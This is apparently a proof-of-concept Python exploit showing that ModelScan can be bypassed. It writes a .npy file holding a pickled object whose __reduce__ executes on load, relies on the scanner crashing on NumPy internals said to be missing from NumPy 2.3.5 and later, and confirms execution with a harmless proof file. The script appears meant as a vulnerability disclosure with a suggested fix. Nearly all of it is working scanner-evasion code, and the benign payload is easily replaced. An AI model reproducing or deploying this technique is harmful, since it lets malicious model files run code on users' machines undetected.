#!/usr/bin/env python3
"""
Simple PoC: ModelScan NumPy Bypass
Creates malicious .npy file that bypasses ModelScan on NumPy >=2.3.5
"""
import numpy as np
import pickle
import os
import sys

class Exploit:
    def __reduce__(self):
        # Create a proof file
        return (open, ('/tmp/numpy_bypass_proof.txt', 'w'))

print("=" * 60)
print("MODELSCAN NUMPY BYPASS PoC")
print("=" * 60)

# Step 1: Show NumPy version
print(f"[*] NumPy version: {np.__version__}")

# Step 2: Show missing internal APIs
print("\n[*] Checking internal APIs ModelScan uses:")
try:
    np.lib.format._check_version
    print("    _check_version: EXISTS (old NumPy)")
except AttributeError:
    print("    _check_version: MISSING (NumPy >=2.3.5) ← BYPASS!")

try:
    np.lib.format._read_array_header
    print("    _read_array_header: EXISTS (old NumPy)")
except AttributeError:
    print("    _read_array_header: MISSING (NumPy >=2.3.5) ← BYPASS!")

# Step 3: Create malicious file
print("\n[*] Creating malicious .npy file...")
exploit_obj = Exploit()
malicious_array = np.array([exploit_obj], dtype=object)
np.save('exploit.npy', malicious_array, allow_pickle=True)
print("    Created: exploit.npy")

# Step 4: Simulate what happens when ModelScan tries to scan
print("\n[*] Simulating ModelScan scan_numpy() function...")
print("    Location: modelscan/tools/picklescanner.py lines 235-236")
print("    Code:")
print("        np.lib.format._check_version(version)")
print("        np.lib.format._read_array_header(stream, version)")
print("\n    Result with NumPy >=2.3.5:")
print("        → AttributeError")
print("        → Scanner crashes/returns error")
print("        → File marked as SCAN_NOT_SUPPORTED")
print("        → BYPASS ACHIEVED")

# Step 5: Show that file still loads and executes
print("\n[*] Testing actual file execution...")
if os.path.exists('/tmp/numpy_bypass_proof.txt'):
    os.remove('/tmp/numpy_bypass_proof.txt')

data = np.load('exploit.npy', allow_pickle=True)
# Trigger unpickling by accessing the element
_ = data[0]

if os.path.exists('/tmp/numpy_bypass_proof.txt'):
    print("    ✓ PAYLOAD EXECUTED! Proof file created.")
    print("    ✓ File bypassed ModelScan detection.")
else:
    print("    ? Proof file not found (check permissions).")

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print("Vulnerability: ModelScan uses internal NumPy APIs removed in 2.3.5+")
print("Impact: Malicious .npy files bypass security scanning")
print("Fix: Use public APIs (read_array_header_1_0/2_0) instead of _*")
print("\nFiles created:")
print("  - exploit.npy (malicious payload)")
print("  - /tmp/numpy_bypass_proof.txt (execution proof)")
